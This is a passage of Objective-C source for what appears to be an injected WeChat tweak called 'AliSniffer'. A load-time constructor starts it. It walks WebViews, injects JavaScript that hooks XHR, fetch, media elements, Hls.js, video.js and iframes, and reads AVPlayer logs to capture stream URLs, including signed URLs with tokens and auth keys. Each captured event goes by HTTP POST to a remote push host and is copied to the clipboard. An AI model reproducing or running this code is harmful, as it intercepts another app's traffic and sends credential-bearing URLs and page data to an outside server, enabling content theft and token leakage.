    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - Banner 提示（非 modal，稳定）

static UIWindow *ALI_BannerWin;
static UILabel  *ALI_BannerLab;
static dispatch_source_t ALI_BannerTimer;

static void ali_banner_show(NSString *text){
    if (!text.length) return;
    on_main(^{
        @try{
            if (!ALI_BannerWin){
                UIWindowScene *scene = nil;
                if (@available(iOS 13.0,*)) {
                    for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
                        if ([s isKindOfClass:[UIWindowScene class]] &&
                            ((UIWindowScene*)s).activationState==UISceneActivationStateForegroundActive){
                            scene = (UIWindowScene*)s; break;
                        }
                    }
                }
                ALI_BannerWin = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
                if (scene) ALI_BannerWin.windowScene = scene;
                ALI_BannerWin.windowLevel = UIWindowLevelStatusBar + 10;
                ALI_BannerWin.backgroundColor = [UIColor clearColor];
                ALI_BannerWin.hidden = NO;

                UIView *host = [[UIView alloc] initWithFrame:ALI_BannerWin.bounds];
                host.userInteractionEnabled = NO;
                [ALI_BannerWin addSubview:host];

                CGFloat W = MIN([UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height) - 32.0;
                ALI_BannerLab = [[UILabel alloc] initWithFrame:CGRectMake((host.bounds.size.width-W)/2.0, 48.0, W, 1)];
                ALI_BannerLab.numberOfLines = 0;
                ALI_BannerLab.textAlignment = NSTextAlignmentCenter;
                ALI_BannerLab.textColor = [UIColor whiteColor];
                ALI_BannerLab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                ALI_BannerLab.layer.cornerRadius = 12.0;
                ALI_BannerLab.layer.masksToBounds = YES;
                ALI_BannerLab.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
                [host addSubview:ALI_BannerLab];
            }

            ALI_BannerLab.text = text;
            CGFloat maxW = ALI_BannerLab.frame.size.width - 24.0;
            CGSize sz = [ALI_BannerLab sizeThatFits:CGSizeMake(maxW, CGFLOAT_MAX)];
            CGRect f  = ALI_BannerLab.frame; f.size.height = sz.height + 16.0; ALI_BannerLab.frame = f;

            ALI_BannerWin.alpha = 0.0; ALI_BannerWin.hidden = NO;
            [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 1.0; }];

            if (ALI_BannerTimer){ dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil; }
            ALI_BannerTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
            dispatch_source_set_timer(ALI_BannerTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.6*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, 0);
            dispatch_source_set_event_handler(ALI_BannerTimer, ^{
                [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 0.0; }
                                 completion:^(__unused BOOL fin){ ALI_BannerWin.hidden = YES; }];
                dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil;
            });
            dispatch_resume(ALI_BannerTimer);
        }@catch(__unused NSException *e){}
    });
}
static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
    (void)title;
    if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
    ali_banner_show(msg.length ? msg : title);
}

#pragma mark - 上报

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}
static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

#pragma mark - 事件

static void handleRawEvent(NSDictionary *evt){
    NSString *js = jsonStringify(evt); if (js) postText(js);

    NSString *u = evt[@"url"]; if (!u) return;
    BOOL like = looksLikeStream(u);

    if (kForceUploadAll || like){
        if (!dedupe_skip(u)){
            if (kPopupOnHit){
                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = u; });
                popup_safe(@"抓到 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
            }else if (kCopyOnHit){
                on_main(^{ UIPasteboard.generalPasteboard.string = u; });
            }
            NSDictionary *hit = @{@"type": @"JS_HIT",
                                  @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                  @"url": u,
                                  @"page": evt[@"page"] ?: @"",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s2 = jsonStringify(hit); if (s2) postText(s2);
        }
    }
}
static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (dedupe_skip(url)) return;

    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                          @"from": from ?: @"native",
                          @"url": url,
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);

    if (looksLikeStream(url)){
        if (kPopupOnHit){
            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
            popup_safe(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
        }else if (kCopyOnHit){
            on_main(^{ UIPasteboard.generalPasteboard.string = url; });
        }
    }
}

#pragma mark - inpage JS（v3）

static NSString *inpageJS(void){
    return @
"(function(){try{"
 "function send(t,d){try{var p=d||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
  "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);} }catch(e){}}"
 "function looks(u){if(!u)return false;u=(''+u).toLowerCase();"
  "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1)return true;"
  "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
  "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1)return true;return false;}"
 "function hit(from,u){try{send('HIT',{from:from,url:u});}catch(e){}}"

 "send('INJECT_OK',{}); send('PAGE_READY',{});"

 "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
   "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
   "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
     "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
       "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
       "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))hit('xhr',u);}catch(e){}};"
     "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
 "})();"
 "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
   "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});"
     "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
       "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
         "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
       "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}"
       "if(looks(u))hit('fetch',u);}catch(e){}return r;});}"
   "catch(e){return F.apply(this,arguments)}})();"

 "(function(){if(!('PerformanceObserver'in window))return;try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))hit('perf',u);}}catch(e){}});"
   "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
 "(function(){try{var nodes=document.querySelectorAll('link[rel=\"preload\"],[src],[href]');for(var i=0;i<nodes.length;i++){var n=nodes[i];var u=n.src||n.href||'';if(u){send('RES_INIT',{from:n.tagName.toLowerCase(),url:u});if(looks(u))hit('init-scan',u);}}}catch(e){}})();"

 "(function(){if(window.__ali_media_v3__)return;window.__ali_media_v3__=true;"
   "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))hit(tag,s);}}catch(e){}}"
   "try{var HTMLME=(HTMLMediaElement||HTMLVideoElement||window.HTMLMediaElement);if(HTMLME&&HTMLME.prototype){var dp=Object.getOwnPropertyDescriptor(HTMLME.prototype,'src');if(dp&&dp.set&&!HTMLME.prototype.__ali_src_set__){HTMLME.prototype.__ali_src_set__=true;var old=dp.set;Object.defineProperty(HTMLME.prototype,'src',{configurable:true,enumerable:false,get:dp.get,set:function(v){try{var u=(v||'').toString();send('MEDIA_SETTER',{from:'src-setter',url:u});if(looks(u))hit('src-setter',u);}catch(e){}return old.call(this,v);}});}}}catch(e){}"
   "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(!n)continue;"
     "if(n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} if(t==='source'||t==='video'||t==='audio'){var u=n.src||n.currentSrc||'';if(u){send('MEDIA_SET',{from:'mut',url:u});if(looks(u))hit('mut',u);}}}"
     "if(n.querySelectorAll){var vs=n.querySelectorAll('video,audio,source');for(var j=0;j<vs.length;j++){var el=vs[j];var tg=el.tagName.toLowerCase();if(tg==='source'){var u2=el.src||'';if(u2){send('MEDIA_SET',{from:'mut-sub',url:u2});if(looks(u2))hit('mut-sub',u2);}}else if(tg==='video'||tg==='audio'){report(el,tg,'sub');el.addEventListener&&el.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}}});"
   "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
   "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
   "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio'||t==='source')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))hit('setAttr',v);}}}catch(e){}return setA.apply(this,arguments)};}"
 "})();"

 "(function(){try{if(window.Hls && !window.Hls.__ali_patched__){window.Hls.__ali_patched__=true;var P=window.Hls.prototype;if(P&&P.loadSource){var _ls=P.loadSource;P.loadSource=function(u){try{send('HLS_LOADSOURCE',{from:'hls.js',url:u});if(looks(u))hit('hls.js',u);}catch(e){}return _ls.apply(this,arguments)};}}}catch(e){}})();"
 "(function(){try{if(window.videojs && !window.videojs.__ali_patched__){window.videojs.__ali_patched__=true;var V=window.videojs;var hook=function(p){try{var _src=p.src;if(_src){p.src=function(u){try{var uu=(typeof u==='string')?u:(u&&u.src)||'';if(uu){send('VIDEOJS_SRC',{from:'video.js',url:uu});if(looks(uu))hit('video.js',uu);}}catch(e){}return _src.apply(this,arguments)};}}catch(e){}};try{var pl=V.getPlayers?V.getPlayers():null;if(pl){for(var k in pl){if(pl[k]&&pl[k].player)hook(pl[k].player);} } }catch(e){} V.hook&&V.hook('setup',function(p){try{p&&hook(p)}catch(e){}});}}catch(e){}})();"

 "(function(){if(window.__ali_iframe__)return;window.__ali_iframe__=true;"
   "function repIF(f,ev){try{var u=f.src||'';if(u){send('IFRAME',{from:'iframe:'+ev,url:u});if(looks(u))hit('iframe',u);} }catch(e){}}"
   "var iobs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(n&&n.tagName&&n.tagName.toLowerCase()==='iframe'){repIF(n,'add');}}}}});"
   "iobs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
   "var ifs=document.querySelectorAll&&document.querySelectorAll('iframe');for(var i=0;i<(ifs?ifs.length:0);i++){repIF(ifs[i],'init');}"
   "var setA=HTMLIFrameElement&&HTMLIFrameElement.prototype&&HTMLIFrameElement.prototype.setAttribute; if(setA && !HTMLIFrameElement.prototype.__ali_if_set__){HTMLIFrameElement.prototype.__ali_if_set__=true;HTMLIFrameElement.prototype.setAttribute=function(k,v){try{if(k&&k.toLowerCase()==='src'){send('IFRAME_SET',{from:'setAttr',url:v});if(looks(v))hit('iframe-set',v);} }catch(e){} return setA.apply(this,arguments)};}"
 "})();"

 "(function(){if(window.__ali_nav__)return;window.__ali_nav__=true;"
   "function nav(){try{send('NAV',{url:location.href});}catch(e){}}"
   "window.addEventListener('hashchange',nav,true);"
   "if(window.history){['pushState','replaceState'].forEach(function(k){try{var fn=history[k];if(!fn||fn.__ali) return;history[k]=function(){var r=fn.apply(this,arguments);try{nav();}catch(e){}return r};history[k].__ali=true;}catch(e){}});}"
   "document.addEventListener('readystatechange',function(){nav();},true);"
   "setTimeout(nav,200);"
 "})();"

 "(function(){if(window.__ali_ping__)return;window.__ali_ping__=true;var last='';setInterval(function(){try{var u=location.href;if(u!==last){last=u;send('PING',{url:u});}}catch(e){}},1200);} )();"

 "console.log('[ALI_SNIF] injected v3');"
"}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
}

#pragma mark - WK 注入（命中域名才注入）

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler> @end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end
static ALIMessageHandler *g_handler = nil;

static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO; NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()) if ([h hasSuffix:pat.lowercaseString]) return YES;
    return NO;
}
static void prime_userScript_for_allFrames(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    @try{
        WKUserContentController *ucc = wv.configuration.userContentController;
        for (WKUserScript *s in ucc.userScripts) if ([s.source containsString:@"ALI_SNIF"]) return;
        WKUserScript *us = [[WKUserScript alloc] initWithSource:inpageJS()
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
                                               forMainFrameOnly:NO];
        [ucc addUserScript:us];
        if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
            @try{ [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    }@catch(__unused NSException *e){}
}
static void try_inject_when_ready(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    if (wv.estimatedProgress < kProgressThreshold) return;

    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:[NSString class]] ? val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;

        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
            NSURL *u = wv.URL; if (!hostMatches(u)) return;

            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

            WKUserContentController *ucc = wv.configuration.userContentController;
            @try{
                if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
                    [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                }
                if (!g_handler) g_handler = [ALIMessageHandler new];
                [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
            }@catch(__unused NSException *e){}

            [wv evaluateJavaScript:inpageJS() completionHandler:nil];

            if (kPopupOnInject){
                NSString *host = wv.URL.host ?: @"(null)";
                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = (wv.URL.absoluteString ?: @""); });
                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media/Hls.js/iframe）", host], nil);
            }
            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"app": @"WeChat",
                                  @"page": (wv.URL.absoluteString ?: @""),
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
        });
    }];
}

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{ [self.wv removeObserver:self forKeyPath:@"URL"];
          [self.wv removeObserver:self forKeyPath:@"estimatedProgress"]; }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object; if (![wv isKindOfClass:[WKWebView class]]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
}
@end
static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}
static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}
static void scan_loop(void){
    on_main(^{
        @try{ for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w); }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - AV AccessLog（适配原生播放器）

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            id ev = [log events].lastObject;
                            SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:sel]) {
                                NSString *uri = [ev performSelector:sel];
                                if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                            }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                SEL sel2 = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:sel2]) {
                                    NSString *uri2 = [ev performSelector:sel2];
                                    if (uri2.length) dispatch_async(gq, ^{ handleCapturedURL(uri2, @"AVErrorLog"); });
                                }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - 启动闸门（避免微信一进程就崩）

static void start_if_needed(void){
    if (g_started) return; g_started = YES;
    on_main(^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            scan_loop();
            installAVObservers();
            NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
            ali_banner_show(@"AliSniffer 已就绪（进入直播/回放页将自动注入）");
        });
    });
}

#pragma mark - 入口（只注册通知）

__attribute__((constructor))
static void ALIWeChatSniffer_Full_Init(void){
    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.full", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];

    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    if (@available(iOS 13.0,*)) {
        [nc addObserverForName:UISceneDidActivateNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
        [nc addObserverForName:UISceneWillEnterForegroundNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    }
    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
}
